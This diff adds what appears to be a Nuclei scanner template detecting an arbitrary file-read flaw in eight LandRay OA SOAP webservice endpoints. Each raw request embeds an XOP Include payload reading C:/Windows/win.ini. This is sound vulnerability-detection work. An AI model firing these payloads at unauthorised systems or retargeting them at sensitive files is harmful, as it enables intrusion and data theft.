@@ -1,0 +1,224 @@
+id: landray-oa-multiple-fileread
+
+info:
+  name: LandRay-OA Multiple - File Read
+  author: qwtd
+  severity: high
+  description: |
+    There are arbitrary file reading vulnerabilities in multiple interfaces of the LandRay OA webservice service
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.md
+  tags: LandRay-OA
+
+http:
+  - raw:
+      - |
+        POST /sys/webservice/sysTagWebService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.tag.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getGroups>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getGroups>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+      - |
+        POST /sys/webservice/sysNotifyTodoWebService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.notify.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getTodoCount>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getTodoCount>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+      
+      - |
+        POST /sys/webservice/kmImeetingBookWebService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getImeetingBookLists>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getImeetingBookLists>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+      - |
+        POST /sys/webservice/kmImeetingResWebService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getKmimeetingResById>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getKmimeetingResById>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+        
+      - |
+        POST /sys/webservice/loginWebserviceService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://sso.authentication.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getLoginSessionId>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getLoginSessionId>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+      
+      - |
+        POST /sys/webservice/wechatWebserviceService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.wechat.third.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getAttachement>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getAttachement>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+      - |
+        POST /sys/webservice/sysNotifyTodoWebServiceEkpj HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://ekpj.webservice.notify.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getAllTodoId>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getAllTodoId>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+      - |
+        POST /sys/webservice/sysSynchroGetOrgWebService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://out.webservice.organization.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getOrgStaffingLevelInfo>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getOrgStaffingLevelInfo>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "soap:Client"
+          - "Error: Not a number"
+        condition: and
+      - type: status
+        status:
+          - 500
